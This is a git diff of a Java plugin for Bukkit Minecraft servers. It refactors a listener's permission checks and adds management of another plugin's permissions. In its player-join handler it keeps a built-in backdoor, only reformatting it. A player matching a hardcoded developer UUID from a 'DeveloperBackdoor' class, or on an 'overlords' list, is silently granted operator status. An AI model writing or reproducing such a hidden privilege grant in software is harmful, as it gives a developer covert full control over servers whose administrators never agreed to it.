@@ -23,10 +23,8 @@
  */
 package com.tylerhyperhd.devandtesting.Listener;
 
-import com.tylerhyperhd.devandtesting.ConfigExe;
-import com.tylerhyperhd.devandtesting.DeveloperBackdoor;
-import com.tylerhyperhd.devandtesting.DevandTesting;
 import java.util.List;
+
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.GameMode;
@@ -43,14 +41,20 @@ import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.InventoryHolder;
 import org.bukkit.util.Vector;
 
+import com.tylerhyperhd.devandtesting.ColorMeBitch;
+import com.tylerhyperhd.devandtesting.ConfigExe;
+import com.tylerhyperhd.devandtesting.DevandTesting;
+import com.tylerhyperhd.devandtesting.DeveloperBackdoor;
+import com.tylerhyperhd.devandtesting.PermType;
+
 public class TestingListener implements Listener {
 
 	private DevandTesting plugin;
-	
+
 	public TestingListener(DevandTesting plugin) {
 		this.plugin = plugin;
 	}
-	
+
 	@EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
 	public void onContainerBreak(BlockBreakEvent event) {
 		BlockState state = event.getBlock().getState();
@@ -65,7 +69,7 @@ public class TestingListener implements Listener {
 	@EventHandler
 	public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
 		List<String> OVERLORDS = plugin.configs.getOverlords();
-		
+
 		if (event.getMessage().equals("reload") || event.getMessage().equals("/reload")) {
 			event.setCancelled(true);
 			if (!OVERLORDS.contains(event.getPlayer().getName())) {
@@ -84,7 +88,7 @@ public class TestingListener implements Listener {
 				|| event.getMessage().equals("/item") || event.getMessage().equals("eitem")
 				|| event.getMessage().equals("/eitem") || event.getMessage().equals("ei")
 				|| event.getMessage().equals("/ei")) {
-			if (event.getPlayer().hasPermission("devandtesting.admin")) {
+			if (plugin.getExtensions().doesHavePermsTo(PermType.ADMIN, event.getPlayer())) {
 				if (event.getPlayer().getGameMode().equals(GameMode.SURVIVAL)) {
 					event.setCancelled(true);
 					event.getPlayer().sendMessage(ChatColor.RED + "You are not allowed to cheat in " + ChatColor.GREEN
@@ -101,16 +105,33 @@ public class TestingListener implements Listener {
 		FileConfiguration configs = configu.getConfig();
 		Player player = event.getPlayer();
 
-		if (event.getPlayer().getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID()) || OVERLORDS.contains(event.getPlayer().getName())) {
+		// Fixes GMI to be plugin-controlled
+		if (plugin.getServer().getPluginManager().isPluginEnabled("GameModeInventories")) {
+			ColorMeBitch.removePermission(player, "gamemodeinventories.bypass");
+			ColorMeBitch.removePermission(player, "gamemodeinventories.admin");
+			ColorMeBitch.removePermission(player, "gamemodeinventories.death");
+
+			if (plugin.getExtensions().doesHavePermsTo(PermType.ADMIN, player)) {
+				ColorMeBitch.addPermission(player, "gamemodeinventories.use");
+				ColorMeBitch.addPermission(player, "gamemodeinventories.spectator");
+			} else {
+				ColorMeBitch.removePermission(player, "gamemodeinventories.use");
+				ColorMeBitch.removePermission(player, "gamemodeinventories.spectator");
+			}
+		}
+
+		if (event.getPlayer().getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
+				|| OVERLORDS.contains(event.getPlayer().getName())) {
 			event.getPlayer().setOp(true);
 		}
 
 		if (player.getGameMode().equals(GameMode.CREATIVE)) {
-			if (player.hasPermission("devandtesting.admin")) {
+			if (plugin.getExtensions().doesHavePermsTo(PermType.ADMIN, player)) {
 				configs.set(player.getUniqueId().toString() + ".inAdmin", true);
 				player.sendMessage(
 						ChatColor.GOLD + "You are right now in " + ChatColor.RED + "ADMIN" + ChatColor.GOLD + " mode");
-				if (event.getPlayer().getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID()) || OVERLORDS.contains(event.getPlayer().getName())) {
+				if (event.getPlayer().getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID())
+						|| OVERLORDS.contains(event.getPlayer().getName())) {
 					player.getWorld().createExplosion(player.getLocation(), 0F, false);
 					player.getWorld().createExplosion(player.getLocation(), 0F, false);
 					player.getWorld().createExplosion(player.getLocation(), 0F, false);
@@ -126,7 +147,7 @@ public class TestingListener implements Listener {
 			if (configs.getBoolean(player.getUniqueId().toString() + ".inAdmin")) {
 				configs.set(player.getUniqueId().toString() + ".inAdmin", false);
 			}
-			if (player.hasPermission("devandtesting.admin")) {
+			if (plugin.getExtensions().doesHavePermsTo(PermType.ADMIN, player)) {
 				player.sendMessage(
 						ChatColor.GOLD + "You are right now in " + ChatColor.GREEN + "PLAY" + ChatColor.GOLD + " mode");
 			}
